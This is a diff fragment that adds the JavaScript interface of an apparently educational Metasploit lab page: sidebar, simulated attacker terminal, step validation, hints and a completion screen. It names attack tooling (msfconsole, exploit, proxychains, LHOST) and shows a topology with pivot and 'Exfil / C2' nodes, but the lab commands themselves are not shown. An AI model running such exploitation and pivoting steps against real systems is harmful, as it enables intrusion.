+    <a href="paid-cybersecurity-course.html" style="display:flex; align-items:center; gap:8px; text-decoration:none; color:var(--cyan); padding:10px 20px; margin-bottom:15px; font-size:0.85rem; font-weight:700; border-bottom:1px solid var(--border);">
+      <i class="fas fa-arrow-left"></i> Back to Attack Labs
+    </a>
+    <div class="sidebar-section"><div class="sidebar-label">Attack Labs</div>
+  `;
+  LABS.forEach((lab,i)=>{
+    const done = completedLabs.has(i);
+    const active = i===currentLab;
+    html += `<div class="lab-item ${active?'active':''} ${done?'done':''}" onclick="selectLab(${i})">
+      <div class="lab-icon"><i class="fas ${lab.icon}"></i></div>
+      <div class="lab-info">
+        <div class="lab-name">${lab.name}</div>
+        <div class="lab-cat">${lab.category}</div>
+      </div>
+    </div>`;
+  });
+  html += '</div>';
+  sb.innerHTML = html;
+  document.getElementById('completedCount').textContent = completedLabs.size;
+  document.getElementById('totalCount').textContent = LABS.length;
+}
+
+// ============================================================
+// LAB RENDER
+// ============================================================
+function renderLab(){
+  const lab = LABS[currentLab];
+  const area = document.getElementById('content');
+  const n = lab.network;
+  
+  const netHTML = `
+    <div class="network-nodes">
+      <div class="net-node">
+        <div class="net-icon attacker ${n.a?'pulsing':''}"><i class="fas fa-skull-crossbones"></i></div>
+        <div class="net-label">Attacker</div>
+        <div class="net-ip">10.0.0.5</div>
+      </div>
+      <div class="net-arrow ${n.a1?'active':''}"><i class="fas fa-long-arrow-alt-right"></i></div>
+      <div class="net-node">
+        <div class="net-icon target ${n.t?'pulsing':''}"><i class="fas fa-server"></i></div>
+        <div class="net-label">Target</div>
+        <div class="net-ip">10.0.0.0/24</div>
+      </div>
+      <div class="net-arrow ${n.t2?'active':''}"><i class="fas fa-long-arrow-alt-right"></i></div>
+      <div class="net-node">
+        <div class="net-icon internal ${n.i?'pulsing':''}"><i class="fas fa-network-wired"></i></div>
+        <div class="net-label">Pivot Net</div>
+        <div class="net-ip">192.168.50.0/24</div>
+      </div>
+      <div class="net-arrow ${n.i3?'active':''}"><i class="fas fa-long-arrow-alt-right"></i></div>
+      <div class="net-node">
+        <div class="net-icon exfil ${n.e?'pulsing':''}"><i class="fas fa-database"></i></div>
+        <div class="net-label">Exfil / C2</div>
+        <div class="net-ip">Local</div>
+      </div>
+    </div>`;
+
+  let dotsHTML = '';
+  lab.steps.forEach((_,i)=>{
+    dotsHTML += `<div class="step-dot ${i===currentStep?'active':''} ${i<currentStep?'done':''}"></div>`;
+  });
+
+  const objHTML = lab.objectives.map(o=>`<li>${o}</li>`).join('');
+  const toolsHTML = lab.tools.map(t=>`<span class="tool-pill">${t}</span>`).join('');
+  const isComplete = currentStep >= lab.steps.length;
+
+  area.innerHTML = `
+    <div class="lab-header">
+      <div class="lab-tag"><i class="fas ${lab.icon}"></i> Lab ${currentLab+1} of ${LABS.length} · ${lab.category}</div>
+      <h1>${lab.name}</h1>
+      <p>${lab.description}</p>
+    </div>
+
+    <div class="scenario">
+      <i class="fas fa-triangle-exclamation"></i>
+      <div class="scenario-text"><strong>Scenario:</strong> ${lab.scenario}</div>
+    </div>
+
+    <div class="complete-banner ${isComplete?'show':''}" id="completeBanner">
+      <i class="fas fa-circle-check"></i>
+      <span>Lab completed — all steps executed successfully. Move to the next lab when ready.</span>
+    </div>
+
+    <div class="lab-progress">
+      <div class="step-dots">${dotsHTML}</div>
+      <div class="step-text">Step <span>${Math.min(currentStep+1, lab.steps.length)}</span> / ${lab.steps.length}</div>
+    </div>
+
+    <div class="network-card">
+      <div class="network-title"><i class="fas fa-diagram-project"></i> Attack Topology</div>
+      ${netHTML}
+    </div>
+
+    <div class="card">
+      <div class="card-head">
+        <div class="card-icon green"><i class="fas fa-bullseye"></i></div>
+        <div class="card-title">Objectives</div>
+      </div>
+      <div class="card-body"><ul>${objHTML}</ul></div>
+    </div>
+
+    <div class="card">
+      <div class="card-head">
+        <div class="card-icon cyan"><i class="fas fa-wrench"></i></div>
+        <div class="card-title">Tools Used</div>
+      </div>
+      <div class="card-body">${toolsHTML}</div>
+    </div>
+
+    <div class="terminal-wrap">
+      <div class="terminal-bar">
+        <div class="term-left">
+          <div class="term-dots"><span></span><span></span><span></span></div>
+          <div class="term-tab">root@kali: ~/${lab.id}</div>
+        </div>
+        <div class="term-actions">
+          <button class="term-btn" onclick="clearTerminal()"><i class="fas fa-eraser"></i> Clear</button>
+          <button class="term-btn" onclick="showSolution()"><i class="fas fa-lightbulb"></i> Solution</button>
+        </div>
+      </div>
+      <div class="terminal-body" id="terminalBody">
+        <div class="t-line t-output"># ${lab.name} — Interactive CLI Lab</div>
+        <div class="t-line t-output"># Type the appropriate command for each step, then press Enter.</div>
+        <div class="t-line t-output"># Use the up/down arrow keys to browse command history.</div>
+        <div class="t-line t-separator">${'─'.repeat(60)}</div>
+        ${currentStep < lab.steps.length ? `
+        <div class="t-line t-step">>> Step ${currentStep+1}: ${lab.steps[currentStep].instruction}</div>
+        ` : `<div class="t-success">>> Lab complete! All steps executed.</div>`}
+      </div>
+    </div>
+
+    ${currentStep < lab.steps.length ? `
+    <div class="hint-panel">
+      <div class="hint-icon"><i class="fas fa-lightbulb"></i></div>
+      <div class="hint-content">
+        <div class="hint-label">Hint for current step</div>
+        <div class="hint-text">${lab.steps[currentStep].hint}</div>
+      </div>
+    </div>` : ''}
+
+    <div style="display:flex; gap:12px; flex-wrap:wrap; margin-bottom:24px;">
+      ${currentStep >= lab.steps.length ? `
+        <button class="btn primary" onclick="nextLab()"><i class="fas fa-arrow-right"></i> Next Lab</button>
+        <button class="btn" onclick="resetCurrent()"><i class="fas fa-rotate-left"></i> Retry Lab</button>
+      ` : `
+        <button class="btn" onclick="showSolution()"><i class="fas fa-eye"></i> Reveal Solution</button>
+        <button class="btn" onclick="resetCurrent()"><i class="fas fa-rotate-left"></i> Reset Lab</button>
+      `}
+    </div>
+  `;
+
+  if (currentStep < lab.steps.length) {
+    const tb = document.getElementById('terminalBody');
+    const inputLine = document.createElement('div');
+    inputLine.className = 'term-input-line';
+    inputLine.innerHTML = `<span class="t-prompt">root@kali</span><span class="t-output">:</span><span class="t-highlight">~/${lab.id}</span><span class="t-output"># </span><input type="text" class="term-input" id="termInput" autocomplete="off" spellcheck="false">`;
+    tb.appendChild(inputLine);
+    setTimeout(()=>{ const inp = document.getElementById('termInput'); if(inp){ inp.focus(); bindInput(inp); } },50);
+  }
+}
+
+// ============================================================
+// INPUT HANDLING
+// ============================================================
+function bindInput(input){
+  input.addEventListener('keydown', e=>{
+    if(e.key === 'Enter'){
+      const cmd = input.value;
+      executeCommand(cmd);
+    } else if(e.key === 'ArrowUp'){
+      e.preventDefault();
+      if(historyIdx > 0){ historyIdx--; input.value = commandHistory[historyIdx]; }
+    } else if(e.key === 'ArrowDown'){
+      e.preventDefault();
+      if(historyIdx < commandHistory.length - 1){ historyIdx++; input.value = commandHistory[historyIdx]; }
+      else { historyIdx = commandHistory.length; input.value = ''; }
+    } else if(e.key === 'Tab'){
+      e.preventDefault();
+      const partial = input.value;
+      const suggestions = ['msfconsole','search','use','set','run','exploit','background','route','proxychains','nmap','payload','RHOSTS','LHOST','SESSION'];
+      const match = suggestions.find(s=>s.startsWith(partial) && s !== partial);
+      if(match) input.value = match;
+    }
+  });
+}
+
+function executeCommand(cmd){
+  if(!cmd.trim()) return;
+  const lab = LABS[currentLab];
+  const step = lab.steps[currentStep];
+  const tb = document.getElementById('terminalBody');
+
+  commandHistory.push(cmd);
+  historyIdx = commandHistory.length;
+
+  const echoLine = document.createElement('div');
+  echoLine.className = 't-line';
+  echoLine.innerHTML = `<span class="t-prompt">root@kali</span><span class="t-output">:</span><span class="t-highlight">~/${lab.id}</span><span class="t-output"># </span><span class="t-cmd">${escapeHtml(cmd)}</span>`;
+  tb.insertBefore(echoLine, document.querySelector('.term-input-line'));
+
+  if(step.validate(cmd)){
+    typeOutput(step.output, ()=>{
+      const succLine = document.createElement('div');
+      succLine.className = 't-line t-success';
+      succLine.textContent = '[+] ' + step.success;
+      tb.insertBefore(succLine, document.querySelector('.term-input-line'));
+      
+      const sepLine = document.createElement('div');
+      sepLine.className = 't-line t-separator';
+      sepLine.textContent = '─'.repeat(60);
+      tb.insertBefore(sepLine, document.querySelector('.term-input-line'));
+      
+      currentStep++;
+      
+      document.querySelectorAll('.step-dot').forEach((d,i)=>{
+        d.classList.remove('active');
+        if(i < currentStep) d.classList.add('done');
+        if(i === currentStep) d.classList.add('active');
+      });
+      
+      if(currentStep >= lab.steps.length){
+        completedLabs.add(currentLab);
+        renderSidebar();
+        const finalLine = document.createElement('div');
+        finalLine.className = 't-line t-success';
+        finalLine.innerHTML = '\n[!!!] LAB COMPLETE — All objectives achieved!\n[!!!] Use the "Next Lab" button below to continue.';
+        tb.insertBefore(finalLine, document.querySelector('.term-input-line'));
+        document.querySelector('.term-input-line').remove();
+        document.getElementById('completeBanner').classList.add('show');
+        renderLab();
+      } else {
+        const nextStepLine = document.createElement('div');
+        nextStepLine.className = 't-line t-step';
+        nextStepLine.textContent = `>> Step ${currentStep+1}: ${lab.steps[currentStep].instruction}`;
+        tb.insertBefore(nextStepLine, document.querySelector('.term-input-line'));
+        document.querySelector('.hint-text').innerHTML = lab.steps[currentStep].hint;
+        document.querySelector('.step-text').innerHTML = `Step <span>${currentStep+1}</span> / ${lab.steps.length}`;
+        const inp = document.getElementById('termInput');
+        if(inp){ inp.value = ''; inp.focus(); }
+      }
+      tb.scrollTop = tb.scrollHeight;
+    });
+  } else {
+    const errLine = document.createElement('div');
+    errLine.className = 't-line t-error';
+    errLine.textContent = '[-] Command not recognized or incomplete. Check the hint and try again.';
+    tb.insertBefore(errLine, document.querySelector('.term-input-line'));
+    
+    const hintLine = document.createElement('div');
+    hintLine.className = 't-line t-hint';
+    hintLine.innerHTML = '[?] Hint: ' + step.hint;
+    tb.insertBefore(hintLine, document.querySelector('.term-input-line'));
+    
+    const inp = document.getElementById('termInput');
+    if(inp){ inp.value = ''; inp.focus(); }
+    tb.scrollTop = tb.scrollHeight;
+  }
+}
+
+function typeOutput(text, cb){
+  const tb = document.getElementById('terminalBody');
+  const lines = text.split('\n');
+  let lineIdx = 0;
+  
+  function nextLine(){
+    if(lineIdx >= lines.length){
+      setTimeout(cb, 100);
+      return;
+    }
+    const div = document.createElement('div');
+    div.className = 't-line t-output';
+    div.textContent = lines[lineIdx];
+    tb.insertBefore(div, document.querySelector('.term-input-line'));
+    tb.scrollTop = tb.scrollHeight;
+    lineIdx++;
+    setTimeout(nextLine, 25 + Math.random()*20);
+  }
+  nextLine();
+}
+
+function escapeHtml(s){
+  return s.replace(/[&<>"']/g, m=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[m]));
+}
+
+function clearTerminal(){
+  const tb = document.getElementById('terminalBody');
+  const lab = LABS[currentLab];
+  tb.innerHTML = `<div class="t-line t-output"># Terminal cleared</div>
+    <div class="t-line t-separator">${'─'.repeat(60)}</div>
+    <div class="t-line t-step">>> Step ${currentStep+1}: ${lab.steps[currentStep].instruction}</div>`;
+  const inputLine = document.createElement('div');
+  inputLine.className = 'term-input-line';
+  inputLine.innerHTML = `<span class="t-prompt">root@kali</span><span class="t-output">:</span><span class="t-highlight">~/${lab.id}</span><span class="t-output"># </span><input type="text" class="term-input" id="termInput" autocomplete="off" spellcheck="false">`;
+  tb.appendChild(inputLine);
+  const inp = document.getElementById('termInput');
+  if(inp){ inp.focus(); bindInput(inp); }
+}
+
+function showSolution(){
+  const lab = LABS[currentLab];
+  if(currentStep >= lab.steps.length) return;
+  const step = lab.steps[currentStep];
+  const inp = document.getElementById('termInput');
+  if(inp){
+    const match = step.hint.match(/<code>([^<]+)<\/code>/);
+    if(match){
+      inp.value = match[1].replace(/&lt;/g,'<').replace(/&gt;/g,'>').replace(/&amp;/g,'&').replace(/&quot;/g,'"').replace(/&#39;/g,"'");
+      inp.focus();
+    }
+  }
+}
+
+function selectLab(idx){
+  if(idx === currentLab) return;
+  currentLab = idx;
+  currentStep = 0;
+  commandHistory = [];
+  historyIdx = -1;
+  renderSidebar();
+  renderLab();
+  window.scrollTo({top:0, behavior:'smooth'});
+}
+
+function nextLab(){
+  if(currentLab < LABS.length - 1){
+    currentLab++;
+    currentStep = 0;
+    commandHistory = [];
+    historyIdx = -1;
+    renderSidebar();
+    renderLab();
+    window.scrollTo({top:0, behavior:'smooth'});
+  } else {
+    showFinalScreen();
+  }
+}
+
+function resetCurrent(){
+  currentStep = 0;
+  commandHistory = [];
+  historyIdx = -1;
+  renderLab();
+}
+
+function showFinalScreen(){
+  const area = document.getElementById('content');
+  area.innerHTML = `
+    <div class="final-screen">
+      <div class="final-icon"><i class="fas fa-flag-checkered"></i></div>
+      <h1 style="font-size:2rem;color:var(--fg-bright);margin-bottom:12px;">All Labs Complete</h1>
+      <p style="color:var(--fg-dim);max-width:600px;margin:0 auto 32px;line-height:1.7;">
+        You've completed all ${LABS.length} Metasploit Framework interactive labs covering remote exploitation, post-exploitation, and network pivoting.
+      </p>
+      <div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(180px,1fr));gap:14px;max-width:700px;margin:0 auto 32px;">
+        <div class="card" style="text-align:center;">
+          <div style="font-size:1.8rem;font-weight:800;color:var(--accent);font-family:var(--mono);">${LABS.length}</div>
+          <div style="font-size:.75rem;color:var(--fg-dim);margin-top:4px;">Labs Completed</div>
+        </div>
+        <div class="card" style="text-align:center;">
+          <div style="font-size:1.8rem;font-weight:800;color:var(--cyan);font-family:var(--mono);">${LABS.reduce((a,l)=>a+l.steps.length,0)}</div>
+          <div style="font-size:.75rem;color:var(--fg-dim);margin-top:4px;">Commands Practiced</div>
+        </div>
+        <div class="card" style="text-align:center;">
+          <div style="font-size:1.8rem;font-weight:800;color:var(--orange);font-family:var(--mono);">5</div>
+          <div style="font-size:.75rem;color:var(--fg-dim);margin-top:4px;">MSF Modules</div>
+        </div>
+        <div class="card" style="text-align:center;">
+          <div style="font-size:1.8rem;font-weight:800;color:var(--purple);font-family:var(--mono);">15+</div>
+          <div style="font-size:.75rem;color:var(--fg-dim);margin-top:4px;">Techniques Learned</div>
+        </div>
+      </div>
+      <button class="btn primary" onclick="currentLab=0;currentStep=0;renderSidebar();renderLab();">
+        <i class="fas fa-rotate-left"></i> Start Over
+      </button>
+    </div>
+  `;
+}
+
+// ============================================================
+// BOOT
+// ============================================================
+document.addEventListener('DOMContentLoaded', ()=>{
+  renderSidebar();
+  renderLab();
+});
+
+document.addEventListener('click', e=>{
+  if(e.target.closest('.terminal-body') && !e.target.closest('.term-btn')){
+    const inp = document.getElementById('termInput');
+    if(inp) inp.focus();
+  }
+});
+</script>
+</body>
+</html>
